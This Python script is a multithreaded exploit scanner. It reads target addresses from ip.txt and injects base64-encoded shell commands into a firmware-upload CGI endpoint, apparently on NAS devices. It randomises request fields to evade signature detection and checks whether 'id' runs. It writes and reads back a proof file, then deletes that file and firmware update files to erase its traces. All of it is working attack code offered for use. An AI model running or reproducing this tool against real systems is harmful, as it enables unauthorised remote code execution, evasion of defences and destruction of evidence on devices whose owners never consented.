import requests
import base64
import random
import string
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings globally
requests.packages.urllib3.disable_warnings()


def get_random_string(length=8):
    """Generates a random lowercase string to bypass static signature detection."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def send_custom_post(url, payload_cmd, use_file=False, filename='a'):
    """Constructs and sends a multipart POST request matching Script B's specifications."""
    endpoint = "/cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image"
    target_url = f"{url.rstrip('/')}{endpoint}"

    # 1. Base64 encode the intended command
    cmd_b64 = base64.b64encode(payload_cmd.encode()).decode()

    # 2. Replicate Script B's outer double-quote syntax enclosure
    if use_file:
        payload_body = f'"$($(echo -n {cmd_b64}|base64 -d > {filename}))"'
    else:
        payload_body = f'"$($(echo -n {cmd_b64}|base64 -d))"'

    # 3. URL encode the payload structures (quotes and semicolons) to match percent encoding
    payload_body = payload_body.replace('"', '%22').replace(';', '%3B')

    # 4. Enforce the critical 128-byte parameter buffer boundary check
    if len(payload_body) > 127:
        print(
            f"[-] Error: Payload too long ({len(payload_body)} bytes), must be < 128 bytes. Command omitted: {payload_cmd}")
        return None

    # 5. Randomize form-data keys completely to replicate Script B's behavior
    boundary = get_random_string(8)
    key1 = get_random_string(8)
    key2 = get_random_string(8)
    val2 = get_random_string(8)

    # Reconstruct exact raw multipart payload structure
    multipart_data = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; {key1}="field2"; {key2}="{payload_body}"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
        f"{val2}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "User-Agent": "Mozilla Macintosh",  # Synchronized with Script B User-Agent
        "Accept": "*/*",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(multipart_data.encode('utf-8')))
    }

    try:
        # Pass data as pre-encoded bytes to ensure strict control over content-length
        response = requests.post(target_url, data=multipart_data.encode('utf-8'), headers=headers, timeout=8,
                                 verify=False)
        return response
    except Exception as e:
        return None


def verify_target(url):
    """Vulnerability validation and footprint erasure execution workflow."""
    print(f"[*] Scanning: {url}")

    # Stage 1: Immediate echo verification
    resp = send_custom_post(url, "id")
    if resp and resp.status_code == 200 and "uid=" in resp.text:
        print(f"[!!!] Critical vulnerability found (Direct Echo): {url}")
        return

    # Stage 2: File upload/write and execution callback verification
    file_name = get_random_string(5)  # Keeps the filename concise

    # Write output to file via relative path
    send_custom_post(url, "id", use_file=True, filename=file_name)

    # Attempt to read the newly dropped verification payload output
    file_url = f"{url.rstrip('/')}/cgi-bin/quick/{file_name}"
    try:
        res_read = requests.get(file_url, timeout=5, verify=False)
        if res_read.status_code == 200 and "uid=" in res_read.text:
            print(f"[!!!] Critical vulnerability found (File Write/Read): {url}")
            print(f"      [+] Result: {res_read.text.strip()}")

            # === Thorough post-exploitation cleanup block ===
            # 1. Purge the dropped evaluation file using its relative path context
            send_custom_post(url, f"rm -f {file_name}")
            # 2. Purge the backend firmware upgrade unpack destination caches
            send_custom_post(url, "rm -f /mnt/HDA_ROOT/update/*")
            print(f"[+] Cleanup operations successfully finalized for {url}")
            return
    except Exception as e:
        pass

    print(f"[-] Target {url} appears not vulnerable or is protected.")


def main():
    try:
        with open("ip.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Error: ip.txt file not found.")
        return

    # Standardize input string URLs
    formatted_targets = []
    for t in targets:
        if not t.startswith("http://") and not t.startswith("https://"):
            t = "http://" + t
        formatted_targets.append(t)

    print(f"[*] Starting multi-threaded scan. Total targets loaded: {len(formatted_targets)}")

    # Execute concurrent worker scanning threads
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(verify_target, formatted_targets)

    print("[*] Scan complete.")


if __name__ == "__main__":
    main()